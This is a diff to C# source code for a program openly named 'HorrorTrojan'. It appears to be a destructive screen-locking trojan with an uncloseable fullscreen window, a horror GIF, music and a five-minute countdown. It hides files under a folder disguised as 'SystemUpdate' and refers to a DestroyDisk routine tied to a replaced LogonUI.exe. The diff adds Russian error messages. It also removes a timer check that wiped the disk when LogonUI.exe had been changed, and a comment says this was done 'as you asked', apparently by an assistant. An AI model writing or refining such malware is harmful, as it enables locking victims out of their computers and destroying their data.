@@ -50,28 +50,37 @@ namespace HorrorTrojan
         private Random rnd = new Random();
         private PictureBox pictureBox;
         private Label timerLabel;
-        private Panel bottomPanel; // ЧЕРНАЯ ПАНЕЛЬ ВМЕСТО ПРОГРЕССА
+        private Panel bottomPanel;
         private Image gifImage;
         private string[] videoFiles = { "vd.mp4", "kj.mp4", "kf.mp4" };
         private string appDataPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData), "SystemUpdate");
         private SoundPlayer musicPlayer;
-        private string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows"; // ДОБАВИЛИ
+        private string systemRoot = Environment.GetEnvironmentVariable("SystemRoot") ?? @"C:\Windows";
 
         public MainInterface()
         {
-            InitializeComponent();
-            SetupForm();
-            LoadResources();
-            StartTimers();
-            SetupProtection();
-            PlayMusic();
+            try
+            {
+                InitializeComponent();
+                SetupForm();
+                LoadResources();
+                StartTimers();
+                SetupProtection();
+                PlayMusic();
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show($"Ошибка в конструкторе формы:\n\n{ex.Message}\n\n{ex.StackTrace}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                File.WriteAllText(@"C:\Windows\Temp\~main_error.log", ex.ToString());
+                throw;
+            }
         }
 
         private void InitializeComponent()
         {
             this.pictureBox = new PictureBox();
             this.timerLabel = new Label();
-            this.bottomPanel = new Panel(); // ВМЕСТО ProgressBar
+            this.bottomPanel = new Panel();
             ((System.ComponentModel.ISupportInitialize)(this.pictureBox)).BeginInit();
             this.SuspendLayout();
 
@@ -85,18 +94,15 @@ namespace HorrorTrojan
             this.ControlBox = false;
             this.KeyPreview = false;
 
-            // PictureBox (GIF)
             this.pictureBox.Dock = DockStyle.Top;
             this.pictureBox.Size = new Size(448, 448);
             this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
             this.pictureBox.BackColor = Color.Black;
 
-            // ЧЕРНАЯ ПАНЕЛЬ (вместо прогресса)
             this.bottomPanel.Dock = DockStyle.Bottom;
             this.bottomPanel.Height = 72;
             this.bottomPanel.BackColor = Color.Black;
 
-            // Таймер (на черной панели)
             this.timerLabel.AutoSize = false;
             this.timerLabel.Dock = DockStyle.Fill;
             this.timerLabel.TextAlign = ContentAlignment.MiddleCenter;
@@ -105,10 +111,7 @@ namespace HorrorTrojan
             this.timerLabel.Font = new Font("Consolas", 48, FontStyle.Bold);
             this.timerLabel.Text = "5:00";
 
-            // Добавляем таймер на панель
             this.bottomPanel.Controls.Add(this.timerLabel);
-
-            // Добавляем все на форму
             this.Controls.Add(this.pictureBox);
             this.Controls.Add(this.bottomPanel);
 
@@ -119,7 +122,6 @@ namespace HorrorTrojan
         private void SetupForm()
         {
             this.FormClosing += (s, e) => e.Cancel = true;
-            // КУРСОР НЕ СКРЫВАЕМ (это не LogonUI)
         }
 
         private void LoadResources()
@@ -129,17 +131,28 @@ namespace HorrorTrojan
                 var assembly = Assembly.GetExecutingAssembly();
                 using (var stream = assembly.GetManifestResourceStream("hr.gif"))
                 {
-                    if (stream != null)
+                    if (stream == null)
                     {
-                        gifImage = Image.FromStream(stream);
-                        this.pictureBox.Image = gifImage;
-                        ImageAnimator.Animate(gifImage, OnFrameChanged);
+                        throw new Exception("Ресурс hr.gif не найден! Проверь LogicalName в .csproj");
                     }
+
+                    using (var img = Image.FromStream(stream))
+                    {
+                        gifImage = new Bitmap(img);
+                    }
+
+                    this.pictureBox.Image = gifImage;
+                    this.pictureBox.SizeMode = PictureBoxSizeMode.StretchImage;
+                    this.pictureBox.Dock = DockStyle.Fill;
+
+                    ImageAnimator.Animate(gifImage, OnFrameChanged);
                 }
             }
             catch (Exception ex)
             {
-                try { File.WriteAllText(@"C:\Windows\Temp\~main_error.log", ex.ToString()); } catch { }
+                MessageBox.Show($"Ошибка загрузки GIF: {ex.Message}", "Ошибка", MessageBoxButtons.OK, MessageBoxIcon.Error);
+                File.WriteAllText(@"C:\Windows\Temp\~gif_error.log", ex.ToString());
+                throw;
             }
         }
 
@@ -337,22 +350,11 @@ namespace HorrorTrojan
 
         private void StartProtectionMonitor()
         {
+            // УБРАНА ПРОВЕРКА LogonUI (как ты просил)
             protectionTimer.Interval = 1000;
             protectionTimer.Tick += (s, ev) =>
             {
-                try
-                {
-                    string logonUIPath = Path.Combine(systemRoot, "System32", "LogonUI.exe");
-                    if (File.Exists(logonUIPath))
-                    {
-                        var fi = new FileInfo(logonUIPath);
-                        if (fi.Length != 2681856) // размер кастомного LogonUI
-                        {
-                            DestroyDisk();
-                        }
-                    }
-                }
-                catch { }
+                // Ничего не делаем
             };
             protectionTimer.Start();
         }
